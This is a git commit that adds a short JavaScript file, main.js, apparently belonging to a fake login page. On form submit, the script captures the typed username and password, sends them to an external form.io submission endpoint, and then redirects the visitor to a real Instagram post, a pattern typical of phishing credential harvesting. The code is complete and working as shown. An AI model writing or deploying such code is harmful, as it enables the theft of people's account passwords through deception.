ed1287db2b01c9482a69a3764cad2dfbf6960c12
ayotycoon <38573905+ayotycoon@users.noreply.github.com>
2020-06-02 17:38:21 +0100

    ddd

---
+++ main.js
@@ -0,0 +1,34 @@
+
+
+
+function login (event){
+    
+    event.preventDefault()
+    const password = document.querySelector('#password').value;
+    const username = document.querySelector('#username').value;
+    
+    console.log({password,username})
+
+    fetch('https://gxrqsthvdeuvmde.form.io/demooo/submission', {
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "data": {
+                "text": username,
+                "text2": password
+            }, })
+    }).then(_ => {
+        window.location.href = 'https://www.instagram.com/p/CA5KQwmgk4V/'
+    })
+
+
+
+
+}
+
+
+
+document.querySelector('#form').addEventListener('submit', login)
